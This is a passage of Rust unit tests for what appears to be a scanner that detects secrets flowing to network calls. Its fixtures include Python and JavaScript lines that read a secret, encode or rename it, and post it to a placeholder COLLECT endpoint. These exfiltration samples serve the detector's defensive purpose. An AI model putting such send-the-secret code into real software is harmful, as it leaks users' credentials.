            "requests.post(COLLECT, json={token: \"host\"})",
            "requests.post(COLLECT, json={\"a\": 1, token: 2})",
            "requests.post(COLLECT, json={\n    token: \"host\",\n})",
        ] {
            assert!(links(&value_rule(), "token", sink), "{sink}");
        }
        let ternary = "axios.post(COLLECT, {\n  data: leak ?\n    token :\n    \"x\",\n});";
        assert!(links_in("app.js", &value_rule(), "token", ternary));
        let prettier = "axios.post(COLLECT, {\n  data: leak\n    ? token\n    : \"x\",\n});";
        assert!(links_in("app.js", &value_rule(), "token", prettier));
    }

    /// A name assigned from the bound one before the send is followed where
    /// the word reading linked the sink, so the exfiltration that encodes the
    /// secret under a new name keeps the link the keyword's name gave it; a
    /// count of the secret is a number, and a client built with it sends
    /// requests with it, not it.
    #[test]
    fn a_derived_name_links_where_the_word_reading_did() {
        for src in [
            "data = read_secret()\nencoded = urlencode(data)\nrequests.post(COLLECT, data=encoded)\n",
            "json = read_secret()\npayload = {k: v for k, v in json.items()}\nrequests.post(COLLECT, json=payload)\n",
            "params = read_secret()\nq = {\"t\": params}\nrequests.get(COLLECT, params=q)\n",
            "files = read_secret()\nblob = {\"f\": files}\nrequests.post(COLLECT, files=blob)\n",
        ] {
            assert!(value_links("s.py", src, 1, 3), "{src}");
        }
        let js = "const body = readSecret();\nconst payload = JSON.stringify({ v: body });\nfetch(COLLECT, { method: \"POST\", body: payload });\n";
        assert!(value_links("a.js", js, 1, 3));
        // The same flow under a name the send does not repeat was never
        // linked, and is not now: no link the word reading did not make.
        let env =
            "env = read_secret()\nencoded = urlencode(env)\nrequests.post(COLLECT, data=encoded)\n";
        assert!(!value_links("s.py", env, 1, 3));
        assert!(chains_in("s.py", &word_rule(), env, 1, 3).is_empty());
        // Counted, or used to build a client.
        for src in [
            "secrets = read_secret()\ncount = len(secrets.splitlines())\nrequests.post(REPORT, json={\"secrets\": count})\n",
            "secrets = read_secret()\nn = secrets.count(\"\\n\")\nrequests.post(REPORT, json={\"n\": n}, secrets=None)\n",
        ] {
            assert!(!value_links("s.py", src, 1, 3), "{src}");
        }
        let js_count = "const secrets = readSecret();\nconst n = secrets.split(\"\\n\").length;\naxios.post(REPORT, { secrets: n });\n";
        assert!(!value_links("a.js", js_count, 1, 3));
    }

    #[test]
    fn a_count_is_not_the_value() {
        for (text, counted) in [
            ("len(secrets)", true),
            ("len( secrets.splitlines() )", true),
            ("secrets.split(\"\\n\").length", true),
            ("secrets.size", true),
            ("secrets.count(\"\\n\")", true),
            ("secrets", false),
            ("secrets.encode()", false),
            ("mylen(secrets)", false),
            ("len(secrets) + secrets", true),
            ("secrets.length()", false),
        ] {
            let at = text.find("secrets").expect("in the text");
            assert_eq!(only_counted(text.as_bytes(), at, at + 7), counted, "{text}");
        }
        assert!(uses_value(
            "json={\"n\": len(secrets) + secrets}",
            "secrets",
            Lang::Python,
            None
        ));
    }

    /// A source or sink finding that matched only the comment on its line
    /// does not make that line a link.
    #[test]
    fn a_finding_in_a_comment_does_not_link_its_line() {
        // A stand-in for the corpus: CRED-012 matches `SERVICE_KEY`, NET-001
        // matches `requests.`.
        let matches = |id: &str, text: &str| match id {
            "CRED-012" => Some(text.contains("SERVICE_KEY")),
            "NET-001" => Some(text.contains("requests.")),
            _ => None,
        };
        let run = |file: &str, src: &str| {
            let lines: Vec<&str> = src.lines().collect();
            let findings = vec![
                Finding {
                    file: file.to_string(),
                    ..f("CRED-012", 1)
                },
                Finding {
                    file: file.to_string(),
                    ..f("NET-001", 1)
                },
            ];
            apply_matching(&[value_rule()], &findings, &lines, &matches).len()
        };
        assert_eq!(
            run(
                "s.py",
                "requests.get(STATUS)  # SERVICE_KEY is not sent here\n"
            ),
            0
        );
        assert_eq!(
            run(
                "s.py",
                "key = read(\"SERVICE_KEY\")  # later requests.post to the vault\n"
            ),
            0
        );
        assert_eq!(
            run(
                "run.sh",
                "fetch \"$STATUS\"   # requests. SERVICE_KEY stays local\n"
            ),
            0
        );
        // In code, the same line links.
        assert_eq!(
            run(
                "s.py",
                "requests.post(COLLECT, json={\"k\": read(\"SERVICE_KEY\")})  # telemetry\n"
            ),
            1
        );
        // A `#` inside a string is not a comment.
        assert_eq!(
            run(
                "s.py",
                "requests.post(COLLECT, data=\"# \" + read(\"SERVICE_KEY\"))\n"
            ),
            1
        );
        // Without a matcher (or for a rule it does not know), the line links
        // as before.
        let lines = vec!["requests.get(STATUS)  # SERVICE_KEY is not sent here"];
        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
        assert_eq!(apply(&[value_rule()], &findings, &lines).len(), 1);
        // The word reading does not ask.
        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
        assert_eq!(
            apply_matching(&[word_rule()], &findings, &lines, &matches).len(),
            1
        );
    }

    #[test]
    fn comments_are_blanked_and_strings_kept() {
        assert_eq!(
            without_comments("x = \"a # b\"  # note", Lang::Python),
            "x = \"a # b\"        "
        );
        assert_eq!(
            code_only("x = \"a # b\"  # note", Lang::Python),
            "x = \"     \"        "
        );
        assert_eq!(
            without_comments("f(); // note", Lang::CLike),
            "f();        "
        );
        assert_eq!(without_comments("a=$(b) # c", Lang::Hash), "a=$(b)    ");
        assert_eq!(without_comments("a#b", Lang::Hash), "a#b");
        // A regular-expression literal is text; a quote inside it opens no
        // string. After a name or `)`, `/` divides.
        assert_eq!(
            code_only("s.replace(/\"/g, token)", Lang::CLike),
            "s.replace(/ /g, token)"
        );
        assert_eq!(
            code_only("const re = /token=([^/&]+)/;", Lang::CLike),
            "const re = /              /;"
        );
        assert_eq!(code_only("x = a / b / c", Lang::CLike), "x = a / b / c");
        assert_eq!(
            code_only("x = (a) / 2 / token", Lang::CLike),
            "x = (a) / 2 / token"
        );
        assert_eq!(
            without_comments("s.replace(/\"/g, t)", Lang::CLike),
            "s.replace(/\"/g, t)"
        );
        assert!(uses_value(
            &code_only(
                "fetch(u, { body: s.replace(/'/g, \"\") + token })",
                Lang::CLike
            ),
            "token",
            Lang::CLike,
            None
        ));
        for (text, lang) in [
            ("s = f\"{a!r:>{w}}\" + '\\'' # x", Lang::Python),
            ("const s = `a${b}` /* c */ + 'd';", Lang::CLike),
            ("echo \"$A ${B:-c}\" 'd' # e", Lang::Hash),
        ] {
            assert_eq!(code_only(text, lang).len(), text.len(), "{text}");
            assert_eq!(without_comments(text, lang).len(), text.len(), "{text}");
        }
    }

    /// The value reading stays linear on a long line that repeats the bound
    /// name in shapes it has to look at: keys after `(` in Python (which ask
    /// for the open bracket), a destructuring target, attributes of another
    /// object. Each took quadratic time while every occurrence re-read the
    /// line. So would a line of regular-expression openings that never close,
    /// without the cap on how far one is read. The limits allow for a debug
    /// build and a loaded machine; the quadratic reading needed minutes at
    /// this size.
    #[test]
    fn long_lines_stay_linear() {
        let n = 100_000;
        let limit = if cfg!(debug_assertions) {
            std::time::Duration::from_secs(60)
        } else {
            std::time::Duration::from_secs(10)
        };
        for (file, line) in [
            (
                "a.py",
                format!("requests.post(COLLECT, ({}))", "token: 1, ".repeat(n)),
            ),
            (
                "a.js",
                format!("const [{}] = await fetch(COLLECT);", "token, ".repeat(n)),
            ),
            (
                "a.py",
                format!("requests.post(COLLECT, data=[{}])", "r.token, ".repeat(n)),
            ),
            (
                "a.py",
                format!(
                    "requests.post(COLLECT, data=[{}])",
                    "len(token), ".repeat(n)
                ),
            ),
            // `/` openings of patterns that never close.
            (
                "a.js",
                format!("fetch(COLLECT, {{ q: [{}] }});", "(/[".repeat(n)),
            ),
        ] {
            let src = format!("token = read_secret()\n{line}\n");
            let started = std::time::Instant::now();
            let linked = value_links(file, &src, 1, 2);
            let took = started.elapsed();
            assert!(!linked, "{file}");
            assert!(took < limit, "{file}: {took:?}");
        }
    }
}
